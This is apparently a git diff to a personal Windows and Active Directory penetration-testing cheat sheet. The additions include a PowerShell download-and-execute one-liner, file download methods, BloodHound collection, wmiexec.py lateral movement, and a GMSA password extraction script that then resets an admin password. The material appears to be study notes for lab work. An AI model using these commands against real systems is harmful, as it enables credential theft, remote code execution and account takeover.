@@ -29,17 +29,29 @@ net user <username> <password> /add /domain
 ```
 
 ## Basic
-**Show drives**
+### Show drives
 ```powershell
 powershell -c get-psdrive -psprovider filesystem
 ```
-**Show hidden data streams**
+### Show hidden data streams
 ```powershell
 dir /R
 ```
-**Download files**
+### Download and execute files
 ```powershell
-iex(new-object net.webclient).downloadstring('URL/FILENAME')
+iex(new-object net.webclient).downloadstring('remote_file')
+```
+### Download files
+```powershell
+# Method 1
+(new-object net.webclient).downloadfile(<remote_file>,<output_file>)
+
+# Method 2
+Invoke-WebRequest -Uri <source> -OutFile <output_file>
+
+# Method 3
+Import-Module BitsTransfer
+Start-BitsTransfer -Source <url> -Destination <output_file>
 ```
 
 # Directories to check
@@ -96,6 +108,20 @@ Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ## BloodHound and SharpHound
 This is used to visualise AD environments and discover attack paths.
 
+### Ingestors
+#### SharpHound
+Data collector for BloodHound
+[https://github.com/BloodHoundAD/SharpHound](https://github.com/BloodHoundAD/SharpHound)
+
+#### bloodhound.py
+Python based data collection tool for BloodHound     
+This will run against the domain, so can one run it from a remote machine.
+```bash
+bloodhound-python -u <username> -p <password> -d <domain> -c All -ns <nameserver>                
+```
+[https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)
+
+
 ### Useful info
 - [https://bloodhound.readthedocs.io/en/latest/index.html](https://bloodhound.readthedocs.io/en/latest/index.html)
 - [https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)
@@ -128,6 +154,15 @@ Helps to enumerate and dump AD hashes
 - [https://github.com/fortra/impacket/blob/master/examples/secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
 - [https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)
 
+### wmiexec.py
+Wmi allows to open process in hosts where you know the  username/(password/Hash).     
+Then, Wmiexec uses wmi to execute each command that is asked to execute
+```bash
+wmiexec.py 'domain/username:password@ip'
+```
+
+#### Reference
+- [https://book.hacktricks.xyz/windows-hardening/lateral-movement/wmicexec](https://book.hacktricks.xyz/windows-hardening/lateral-movement/wmicexec)
 
 ## Misconfigurations
 ### DCSync
@@ -157,6 +192,35 @@ Most config files can be found in `C:\Windows\System32\config`
 ```bash
 secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
 ```
+
+# GMSA and ReadGMSAPassword
+Group Managed Service Accounts (GMSA) are where Windows servers manage the password for an account by generating a long random password for it.
+
+## Get password
+This solution is taken from: [https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password](https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password)
+```powershell
+# Get the password
+$gmsa = Get-ADServiceAccount -Identity <user> -Properties 'msDS-ManagedPassword'
+$mp = $gmsa.'msDS-ManagedPassword'
+ConvertFrom-ADManagedPasswordBlob $mp
+
+# Save the password to variables
+(ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
+$password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
+$SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
+
+
+# !!!!
+# Reset password of admin if the compromised user has GenericAll permissions
+$cred = New-Object System.Management.Automation.PSCredential <user>, $SecPass
+Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity <admin_user> -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'PASSWORD' -force)} -Credential $cred
+```
+
+### References
+- [https://aadinternals.com/post/gmsa/](https://aadinternals.com/post/gmsa/)
+- [https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/](https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/)
+- [https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password](https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password)
+- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=windowsdesktop-7.0](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=windowsdesktop-7.0)
 
 # Mount windows shares and VHD files
 The Common Internet File System (CIFS) is a network file-sharing protocol. CIFS is a form of SMB.    
@@ -198,3 +262,20 @@ python3 mremoteng_decrypt.py -s <string>
 ```
 
 [https://github.com/kmahyyg/mremoteng-decrypt](https://github.com/kmahyyg/mremoteng-decrypt)
+
+# Analyse office files
+Modern *Office* documents are just zip archives with XML files so, just unzip it and look for data within the XML files.
+
+## Unzip
+```bash
+unzip <file>
+```
+
+## oletools
+```bash
+# Download tools
+sudo pip3 install -U oletools
+
+# Extract macros
+olevba -c <file>
+```
